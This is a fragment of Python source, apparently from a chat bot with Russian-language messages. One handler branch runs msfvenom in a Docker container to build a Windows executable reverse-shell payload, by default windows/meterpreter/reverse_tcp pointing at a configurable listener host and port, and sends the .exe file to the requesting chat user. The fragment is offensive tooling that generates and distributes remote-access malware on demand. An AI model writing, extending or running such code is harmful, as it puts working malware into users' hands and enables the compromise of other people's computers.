    elif state.startswith('msf_payload'):
        import subprocess, tempfile
        payload_type = state.split(':')[1] if ':' in state else 'windows/meterpreter/reverse_tcp'
        lhost = os.environ.get('MSF_HOST', '127.0.0.1')
        lport = int(os.environ.get('MSF_PORT', '4444'))
        output_file = tempfile.mktemp(suffix='.exe')
        cmd = ['docker', 'exec', 'msf', 'msfvenom',
               '-p', payload_type,
               'LHOST=' + lhost,
               'LPORT=' + str(lport),
               '-f', 'exe',
               '-o', output_file]
        try:
            subprocess.run(cmd, check=True, timeout=30)
            with open(output_file, 'rb') as f:
                send_document(chat_id, f, caption=f"Payload {payload_type} готов")
        except Exception as e:
            send_message(f"❌ Ошибка: {e}", chat_id)
        finally:
            os.unlink(output_file)